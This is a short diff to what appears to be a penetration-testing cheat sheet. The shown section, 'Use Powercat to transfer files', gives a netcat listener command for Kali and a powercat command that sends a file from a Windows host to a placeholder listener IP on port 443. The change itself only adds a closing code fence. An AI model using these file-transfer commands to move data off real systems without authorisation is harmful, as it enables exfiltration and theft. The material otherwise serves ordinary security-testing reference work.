@@ -38,5 +38,5 @@ bye
 # Use Powercat to transfer files
 [Kali] nc -lnvp 443 > receiving_file.txt
 [Windows] powercat -c <listener ip address> -p 443 -i \<path-to-file>\sending_file.txt
-
+```
 
